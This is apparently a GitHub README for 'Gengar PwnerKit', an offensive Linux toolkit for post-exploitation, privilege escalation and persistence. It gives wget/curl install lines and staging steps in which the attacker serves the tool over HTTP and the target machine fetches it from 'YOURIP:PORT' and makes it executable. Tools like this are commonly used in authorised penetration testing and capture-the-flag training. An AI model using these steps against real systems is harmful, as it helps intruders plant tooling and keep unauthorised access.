# Gengar PwnerKit

> <div>
>     <img src="https://img.shields.io/badge/-Linux-grey?logo=Linux&logoColor=white" width="70px">
>     <img src="https://img.shields.io/badge/-Bash-green?logo=GNU-Bash&logoColor=white" width="70px">
>     <img src="https://img.shields.io/badge/-Python3-3776AB?logo=Python&logoColor=white" width="90px">
>     <img src="https://img.shields.io/badge/-PHP-777BB4?logo=PHP&logoColor=white" width="60px">
> </div>

> ## | Post Exploration | Privilege Escalation | Persistence |
> 
>                  ![image](https://github.com/h0ru/gpk/blob/main/gengar.gif)
>
> ---

> ## How to install?
> ### Wget:
> ```
> wget -q https://raw.githubusercontent.com/h0ru/gpk/main/gpk -O gpk ; chmod +x gpk
> ```
> ### Curl: 
> ```
> curl -q https://raw.githubusercontent.com/h0ru/gpk/main/gpk -o gpk ; chmod +x gpk
> ```
> ---

> ## How to upload to targets machine?
> ### 1. Download the GPK
> ### 2. Attacker Machine:  
> ```
> python3 -m http.server PORT
> ``` 
> ### 3. Target Machine:
> ```
> wget YOURIP:PORT/gpk ; chmod +x gpk
> ```
> ---

> ## Images
> <div align="center">
>   <h1>  <img src="https://github.com/h0ru/gpk/blob/main/gpk.png" width="500px"> </h1>
>   <h1>  <img src="https://github.com/h0ru/gpk/blob/main/chacal.png" width="500px"> </h1>
> </div>

> ## GPK uses these other scripts
> ### ➫ [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
> ### ➫ [Linux Exploit Suggester ](https://github.com/The-Z-Labs/linux-exploit-suggester)
> ---
